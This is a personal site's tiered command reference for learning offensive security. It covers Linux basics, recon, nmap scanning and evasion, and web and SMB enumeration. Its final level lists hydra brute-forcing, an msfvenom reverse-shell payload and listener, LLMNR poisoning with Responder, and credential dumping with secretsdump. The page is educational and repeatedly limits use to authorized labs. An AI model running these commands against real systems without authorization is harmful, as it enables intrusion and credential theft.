---
layout: page
title: The Terminal Manual
subtitle: A tiered command reference for learning security. Switch levels with the tabs; every command is one I have used in a lab.
permalink: /manual/
---

A working reference for the commands that come up when you start learning offensive security. It is built to be scanned, not read cover to cover. Commands are grouped by task, with the syntax and one line on what each does and when to reach for it.

The sections get harder as you go. If you are new, start at Level 1 and move down only when the commands feel familiar. This manual grows as I learn. Every command here is one I have used in a lab, not a copy of a generic cheat sheet.

## How to read the command lines

- `UPPERCASE` words are placeholders you replace, like `TARGET_IP` or `FILE`.
- A leading `sudo` means the command needs root. Many scanning and capture tools do.
- Anything after a `#` in a code block is a comment, not part of the command.

## One rule before you run anything

Only point these tools at systems you own or are explicitly authorized to test, like a TryHackMe box or your own lab. Scanning or attacking a system without permission is illegal in most places. The commands are the easy part. Staying in scope is the job.

<div class="manual-tabs" role="tablist" aria-label="Manual levels">
  <button class="manual-tab active" type="button" data-level="1" role="tab" aria-selected="true">Level 1</button>
  <button class="manual-tab" type="button" data-level="2" role="tab" aria-selected="false">Level 2</button>
  <button class="manual-tab" type="button" data-level="3" role="tab" aria-selected="false">Level 3</button>
  <button class="manual-tab" type="button" data-level="4" role="tab" aria-selected="false">Level 4</button>
</div>

<div class="manual-panel active" data-level="1" role="tabpanel" markdown="1">

# Level 1 - Linux and Terminal Basics

Everything else builds on these. If you can move around the filesystem, read files, change permissions, and search text, you have the floor covered.

## Moving around

```bash
pwd              # print the folder you are in
ls               # list files in the current folder
ls -la           # list all files, including hidden ones, with details
cd /etc          # change to the /etc folder
cd ..            # go up one folder
cd ~             # go to your home folder
```

## Reading files

```bash
cat file.txt     # print the whole file
less file.txt    # scroll through a long file, press q to quit
head file.txt    # first 10 lines
tail file.txt    # last 10 lines
wc -l file.txt   # count the lines in a file
```

## Moving and copying

```bash
cp file.txt copy.txt        # copy a file
mv file.txt newname.txt     # rename or move a file
mkdir loot                  # make a folder
rm file.txt                 # delete a file
```

## Permissions

Every file has read, write, and execute permissions. You will mostly use this to make a script runnable.

```bash
chmod +x script.sh   # make a script executable so you can run it with ./script.sh
ls -l script.sh      # check the permissions (the rwx letters on the left)
```

## Users and privileges

```bash
whoami        # which user you are
id            # your user and group IDs
sudo COMMAND  # run one command as root
sudo -l       # list what you are allowed to run as root (a key privesc check)
```

`sudo -l` matters in security work. It shows what the current user can run as root, which is often the path to escalating privileges.

## Finding things

```bash
find / -name flag.txt 2>/dev/null      # find a file by name, hide errors
find / -perm -4000 2>/dev/null         # find SUID binaries (privesc hunting)
grep "password" file.txt               # find a word inside a file
grep -r "password" /etc 2>/dev/null    # search a whole folder
```

The `2>/dev/null` part hides the permission-denied noise so you only see real results.

## Piping and redirection

Piping sends the output of one command into another. This is where the terminal gets powerful.

```bash
cat file.txt | grep error      # show only lines containing "error"
ls -la | less                  # page through a long listing
command > out.txt              # save output to a file (overwrite)
command >> out.txt             # save output to a file (append)
```

</div>

<div class="manual-panel" data-level="2" role="tabpanel" markdown="1">

# Level 2 - Networking and Recon

Recon splits in two. Passive recon pulls public data without touching the target. Active recon sends packets to the host and reads what comes back. Both are here.

## Passive: WHOIS and DNS

None of these touch the target. You are querying registrars and DNS servers.

```bash
whois example.com          # domain registration: registrar, dates, name servers
dig example.com            # resolve a domain to an IP
dig example.com MX         # look up mail servers
dig example.com TXT        # TXT records often leak the vendor stack (SPF, verifications)
nslookup example.com       # simpler DNS lookup, similar to dig
```

Read WHOIS carefully: the registrar is who the domain was leased from, the name servers are who hosts the DNS, and they are usually different companies.

## Active: is the host up

```bash
ping -c 5 TARGET_IP        # send 5 packets, check if the host replies
traceroute TARGET_IP       # map the routers between you and the target
```

The TTL in a ping reply hints at the OS. Linux starts at 64, Windows at 128, so a TTL in the high 50s is usually a Linux box a few hops away.

## Talking to a port by hand

`netcat` (`nc`) and `telnet` open a raw connection to any TCP port. Because many services are text based, you can speak them directly and read the banner.

```bash
nc TARGET_IP 21            # connect to FTP, it sends a banner on connect
nc -v TARGET_IP 21         # verbose, shows the connection status first
telnet TARGET_IP 25        # connect to SMTP the old way
```

For HTTP, ask for the file by hand, then press Enter twice:

```bash
nc TARGET_IP 80
GET /flag.txt HTTP/1.1
Host: TARGET_IP
             # blank line here sends the request
```

## curl and wget

`curl` and `wget` are faster than telnet for web work.

```bash
curl -I http://TARGET_IP           # headers only, read the Server: line for the version
curl http://TARGET_IP/robots.txt   # grab a specific file
curl http://TARGET_IP/flag.txt     # print a file straight to the terminal
wget http://TARGET_IP/file.zip     # download a file to disk
```

## Banner grabbing, the idea

All of the above share one goal: get a service to tell you what it is and what version it runs. A version string is the start of everything on the next levels, because a known version can be matched to a known vulnerability.

## Capturing traffic

When a protocol is cleartext, you can read it off the wire. Needs root.

```bash
sudo tcpdump port 110 -A         # capture POP3 traffic, show ASCII (creds are readable)
sudo tcpdump host TARGET_IP -A   # capture everything to/from one host
sudo tcpdump -w capture.pcap     # save packets to a file for Wireshark
```

</div>

<div class="manual-panel" data-level="3" role="tabpanel" markdown="1">

# Level 3 - Scanning and Enumeration

Recon told you a host exists. Enumeration maps everything on it: open ports, service versions, web content, and file shares. This is where most of the useful findings come from, so it is worth being thorough.

## nmap: the core scan

```bash
nmap TARGET_IP                 # quick scan of the top 1000 ports
nmap -p- TARGET_IP             # scan all 65535 ports (services hide on odd ports)
nmap -sV TARGET_IP             # detect service versions
nmap -p- -sV TARGET_IP         # the workhorse: all ports plus versions
nmap -sC -sV TARGET_IP         # add default scripts for extra detail
```

`-p- -sV` is the scan to run first on any box. The all-ports part catches services on non-standard ports, and the version part gives you the banners to match against CVEs.

## nmap: scan types

How nmap probes each port. The SYN and UDP scans need root.

```bash
nmap -sT TARGET_IP         # TCP connect scan, completes the full handshake (no root needed)
sudo nmap -sS TARGET_IP    # TCP SYN scan, half-open and stealthier, the common default
sudo nmap -sU TARGET_IP    # UDP scan, finds services like DNS and SNMP (slow)
```

`-sS` is the go-to for TCP because it is fast and does not finish the handshake. `-sT` is the fallback when you do not have root. `-sU` is worth running because UDP services get missed by TCP-only scans.

## nmap: port range, timing, and speed

```bash
nmap -p- TARGET_IP           # all 65535 ports
nmap -p1-1023 TARGET_IP      # ports 1 to 1023
nmap -F TARGET_IP            # fast scan, top 100 ports only
nmap -T4 TARGET_IP           # timing 0 (slowest) to 5 (fastest), 4 is a good default
nmap --min-rate 15 TARGET_IP # send at least 15 packets/sec
nmap --max-rate 50 TARGET_IP # send no more than 50 packets/sec
```

Timing matters on real engagements. Faster scans are louder and more likely to trip detection, slower scans blend in but take longer.

## nmap: host discovery

```bash
nmap -sn TARGET_IP/24          # ping sweep a subnet, list live hosts only
nmap -sL TARGET_IP/24          # list the targets without sending any probe
```

## nmap: stealth and evasion

Quieter scans and ways to hide the source. These lean on odd TCP flag combinations to slip past simple firewalls, and on spoofing to hide where the scan comes from. All need root.

```bash
sudo nmap -sN TARGET_IP        # null scan, no flags set
sudo nmap -sF TARGET_IP        # FIN scan, only the FIN flag
sudo nmap -sX TARGET_IP        # Xmas scan, FIN + PSH + URG flags
sudo nmap -sA TARGET_IP        # ACK scan, maps firewall rules (unfiltered vs filtered)
```

Null, FIN, and Xmas scans work against a stateless firewall: a closed port replies with RST, an open port stays silent, so no reply means open or filtered. A stateful firewall blocks these, so they are situational.

```bash
sudo nmap -S SPOOFED_IP TARGET_IP          # spoof your source IP
sudo nmap --spoof-mac SPOOFED_MAC TARGET_IP # spoof your MAC address
sudo nmap -D DECOY1,DECOY2,ME TARGET_IP     # decoys, hide your scan among fake sources
sudo nmap -sI ZOMBIE_IP TARGET_IP           # idle scan, bounce the scan off an idle host
```

```bash
sudo nmap -f TARGET_IP           # fragment packets into 8-byte pieces
sudo nmap -ff TARGET_IP          # fragment into 16-byte pieces
sudo nmap --source-port 53 TARGET_IP   # scan from a trusted-looking source port
sudo nmap --reason TARGET_IP     # show why nmap decided each port state (e.g. syn-ack)
```

`--reason` is the one to remember for learning: it shows the evidence, like `syn-ack` for an open port, instead of just the conclusion.

## nmap: service depth and OS detection

```bash
nmap -sV --version-light TARGET_IP  # fewer version probes, faster, less certain
nmap -sV --version-all TARGET_IP    # every probe, slower, more thorough
nmap -O TARGET_IP                   # fingerprint the operating system
nmap --traceroute TARGET_IP         # map the hops to the target
```

`-sV` gives the version banner, which is what you match against known vulnerabilities, and `--version-all` digs harder when the basic probe is unsure. When nmap cannot name the OS exactly it prints the raw fingerprint, and the TTL still hints at it: 64 leans Linux, 128 leans Windows.

## nmap: scripting engine (NSE)

NSE scripts live in `/usr/share/nmap/scripts` and extend nmap well past port scanning.

```bash
nmap -sC TARGET_IP                        # run the default safe scripts
nmap --script=http-robots.txt TARGET_IP   # run a specific script
nmap --script-help SCRIPTNAME             # read what a script does before running it
```

`--script-help` shows the description and category (safe, intrusive, vuln) so you know what a script touches before you run it. Vuln scripts follow the `http-vuln-cveYYYY-NNNN` pattern, named after the CVE.

## nmap: the -A shortcut and saving output

```bash
nmap -A TARGET_IP            # -sV, -O, -sC, and --traceroute in one command
nmap -oN out.txt TARGET_IP   # normal output to a file
nmap -oG out.gnmap TARGET_IP # greppable output
nmap -oX out.xml TARGET_IP   # XML output, parseable by other tools
nmap -oA out TARGET_IP       # all three formats at once
```

`-A` bundles the full workup when you want everything, and `-oA` saves it in every format so you have a record to work from.

## Web content: directory brute force

Finds pages and folders that are not linked anywhere, like admin panels and login pages.

```bash
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://TARGET_IP -w WORDLIST -x php,txt,html   # also try file extensions
dirb http://TARGET_IP                                          # simpler alternative
```

If the app is WordPress:

```bash
wpscan --url http://TARGET_IP --enumerate u    # enumerate WordPress users
```

## Manual content discovery

Before brute forcing, check the files a server exposes by convention. These are free and often point straight at the interesting paths.

```bash
curl http://TARGET_IP/robots.txt    # disallowed paths, a ready-made list of interesting spots
curl http://TARGET_IP/sitemap.xml   # pages the owner wants indexed, sometimes staging or old ones
curl http://TARGET_IP -v            # response headers: Server and X-Powered-By leak the stack
```

Identify the framework from the headers or page source, then read its public docs. They often name the admin path and default credentials.

## Web content: subdomains and vhosts

Gobuster does more than directories. Subdomains resolve through DNS, vhosts are resolved by the web server using the Host header, so they need different modes.

```bash
gobuster dns -d example.thm -w WORDLIST                 # brute force subdomains via DNS
gobuster vhost -u http://TARGET_IP --domain example.thm \
  -w WORDLIST --append-domain --exclude-length 250-320  # brute force virtual hosts
```

`--exclude-length` filters out the common response size so real hits stand out. Subdomains matter because a bug patched on the main site may still be live on a forgotten one.

## Web servers: headers and misconfigurations

Fingerprint the server from its headers, then check for the misconfigurations that permissive defaults leave switched on.

```bash
curl -sI http://TARGET:PORT                     # response headers: Server and X-Powered-By name the stack
curl -sI http://TARGET/ | grep -iE "x-frame|x-content-type|content-security|referrer"  # are the security headers set?
gobuster dir -u http://TARGET -w WORDLIST -x bak,txt   # find backup files (.bak) and unlinked text files
nikto -h http://TARGET:PORT                     # automated sweep: version, status pages, indexing, missing headers
```

Nikto flags where to look in about ten seconds, it does not exploit. Check `/server-status` on Apache and `/nginx_status` on Nginx by hand too, since a stray config line can expose them.

## SMB: Windows file shares

SMB (ports 139 and 445) often allows anonymous access that leaks users and files.

```bash
enum4linux -a TARGET_IP            # full SMB enumeration: users, shares, groups
enum4linux -U TARGET_IP            # just user accounts
smbclient -L //TARGET_IP           # list available shares
smbclient //TARGET_IP/SHARENAME    # connect to a share and browse it
```

Once inside an SMB share, the commands are like FTP: `ls`, `cd`, `get FILE` to download.

## The enumeration mindset

Read everything you can reach. A file that looks like a boring log might be a password list. A forgotten subdirectory might hold an admin login. The goal is not to run one clever command, it is to leave nothing unread.

</div>

<div class="manual-panel" data-level="4" role="tabpanel" markdown="1">

# Level 4 - Passwords and Exploitation

This is where enumeration turns into access. Everything here assumes you are working on an authorized target. These commands can break things and cross legal lines if pointed at a system you do not own.

## Online password attacks: hydra

Hydra tries username and password combinations against a live service until one works.

```bash
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh
hydra -l USERNAME -P WORDLIST TARGET_IP ftp
hydra -l USERNAME -P WORDLIST TARGET_IP imap
```

The flags:

```
-l USERNAME     single username
-L users.txt    a file of usernames
-P WORDLIST     the password list
-s PORT         use a non-default port
-f              stop after the first valid login
-V              show each attempt as it goes
```

For a web login form you tell hydra the fields and the failure message:

```bash
hydra -l USER -P WORDLIST TARGET_IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid password"
```

## Matching a version to an exploit: searchsploit

Take the version banner from your nmap scan and look for a public exploit.

```bash
searchsploit PRODUCT VERSION     # e.g. searchsploit unrealircd
searchsploit -m EXPLOIT_PATH     # copy an exploit to your current folder
```

## Reverse shells

A reverse shell makes the target connect back to you. You listen, then trigger the shell on the target.

```bash
nc -lvnp 4444          # start a listener (l=listen v=verbose n=no-dns p=port)
```

Host a payload or file for the target to pull:

```bash
python3 -m http.server 80    # serve the current folder over HTTP on port 80
```

Build a payload with msfvenom when you need one:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
```

Once a shell lands, the first moves are the Level 1 basics: `id`, `sudo -l`, and reading readable files for credentials.

## Offline hash cracking: john and hashcat

When you recover a password hash rather than a plaintext, crack it offline.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt         # show cracked results

hashcat -m MODE -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

The `-m MODE` is the hash type number (for example 0 for MD5, 1800 for sha512crypt). `hashcat --help | grep -i md5` helps you find the right mode.

## Windows and Active Directory tools

You reach these once you move into AD work. Listed so they are here when you need them.

```bash
crackmapexec smb TARGET_IP -u USER -p PASS       # spray creds across SMB, check access
evil-winrm -i TARGET_IP -u USER -p PASS          # get a shell over WinRM
responder -I eth0                                 # poison LLMNR/NBT-NS to capture hashes
impacket-secretsdump USER:PASS@TARGET_IP          # dump credentials from a domain host
```

## The chain

The levels connect into one flow: recon finds the host, enumeration maps its services, a version leads to an exploit or a login gets cracked, a shell lands, and the Level 1 basics take you from a foothold to full control. That chain is the whole job.

</div>

<div class="manual-nav">
  <button class="btn manual-prev" type="button" disabled>&larr; Previous</button>
  <span class="manual-progress" aria-live="polite">Level 1 of 4</span>
  <button class="btn manual-next" type="button">Next &rarr;</button>
</div>

<script>
  (function () {
    var tabs = Array.prototype.slice.call(document.querySelectorAll('.manual-tab'));
    var panels = Array.prototype.slice.call(document.querySelectorAll('.manual-panel'));
    var prev = document.querySelector('.manual-prev');
    var next = document.querySelector('.manual-next');
    var progress = document.querySelector('.manual-progress');
    var total = tabs.length;
    var current = 1;

    function show(level) {
      level = Math.min(Math.max(level, 1), total);
      current = level;
      tabs.forEach(function (t) {
        var on = t.getAttribute('data-level') === String(level);
        t.classList.toggle('active', on);
        t.setAttribute('aria-selected', on ? 'true' : 'false');
      });
      panels.forEach(function (p) {
        p.classList.toggle('active', p.getAttribute('data-level') === String(level));
      });
      if (prev) prev.disabled = level === 1;
      if (next) next.disabled = level === total;
      if (progress) progress.textContent = 'Level ' + level + ' of ' + total;
      if (window.history && history.replaceState) {
        history.replaceState(null, '', '#level-' + level);
      }
    }

    tabs.forEach(function (t) {
      t.addEventListener('click', function () {
        show(parseInt(t.getAttribute('data-level'), 10));
      });
    });
    if (prev) prev.addEventListener('click', function () { show(current - 1); });
    if (next) next.addEventListener('click', function () { show(current + 1); });

    var m = (window.location.hash || '').match(/^#level-([1-4])$/);
    show(m ? parseInt(m[1], 10) : 1);
  })();
</script>
